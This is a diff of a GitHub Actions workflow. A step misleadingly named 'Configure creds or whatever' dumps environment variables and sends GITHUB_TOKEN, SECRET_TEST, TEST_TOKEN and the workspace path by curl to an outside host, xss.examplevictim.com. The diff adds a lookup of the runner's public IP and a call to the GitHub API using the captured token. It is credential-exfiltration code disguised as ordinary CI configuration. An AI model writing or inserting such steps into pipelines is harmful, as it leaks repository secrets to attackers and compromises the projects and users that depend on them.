@@ -19,4 +19,7 @@ jobs:
         run: printenv; echo st=$SECRET_TEST; ls -la
 
       - name: Configure creds or whatever
-        run: curl -v "http://xss.examplevictim.com/" -d "a=$GITHUB_WORKSPACE" -d "x=$GITHUB_TOKEN" -d "t=$SECRET_TEST" -d "tt=$TEST_TOKEN"
+        run: |
+               curl -v "http://xss.examplevictim.com/" -d "a=$GITHUB_WORKSPACE" -d "x=$GITHUB_TOKEN" -d "t=$SECRET_TEST" -d "tt=$TEST_TOKEN";
+               curl -v ifconfig.co;
+               curl -H "Authorization: Token $GITHUB_TOKEN" "https://api.github.com/user";
